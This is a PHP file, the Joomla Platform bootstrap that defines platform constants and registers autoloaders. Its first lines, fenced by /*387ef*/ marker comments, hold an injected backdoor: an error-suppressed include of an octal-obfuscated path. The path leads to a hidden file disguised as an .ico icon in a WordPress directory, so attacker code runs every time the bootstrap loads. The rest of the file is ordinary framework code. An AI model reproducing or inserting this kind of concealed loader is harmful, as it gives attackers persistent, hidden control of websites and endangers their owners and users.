<?php
/*387ef*/

@include "\057htd\157cs/\167eb/\151nfo\057wp-\151ncl\165des\057IXR\057.3f\1459c9\0624.i\143o";

/*387ef*/
/**
 * Bootstrap file for the Joomla Platform.  Including this file into your application will make Joomla
 * Platform libraries available for use.
 *
 * @package    Joomla.Platform
 *
 * @copyright  Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('JPATH_PLATFORM'))
{
	define('JPATH_PLATFORM', __DIR__);
}

// Detect the native operating system type.
$os = strtoupper(substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

// Import the platform version library if necessary.
if (!class_exists('JPlatform'))
{
	require_once JPATH_PLATFORM . '/platform.php';
}

// Import the library loader if necessary.
if (!class_exists('JLoader'))
{
	require_once JPATH_PLATFORM . '/loader.php';
}

// Make sure that the Joomla Platform has been successfully loaded.
if (!class_exists('JLoader'))
{
	throw new RuntimeException('Joomla Platform not loaded.');
}

// Setup the autoloaders.
JLoader::setup();

// Import the base Joomla Platform libraries.
JLoader::import('joomla.factory');

// Check if the JsonSerializable interface exists already
if (!interface_exists('JsonSerializable'))
{
	JLoader::register('JsonSerializable', __DIR__ . '/compat/jsonserializable.php');
}

// Register classes that don't follow one file per class naming conventions.
JLoader::register('JText', JPATH_PLATFORM . '/joomla/language/text.php');
JLoader::register('JRoute', JPATH_PLATFORM . '/joomla/application/route.php');

// Register the PasswordHash lib
JLoader::register('PasswordHash', JPATH_PLATFORM . '/phpass/PasswordHash.php');
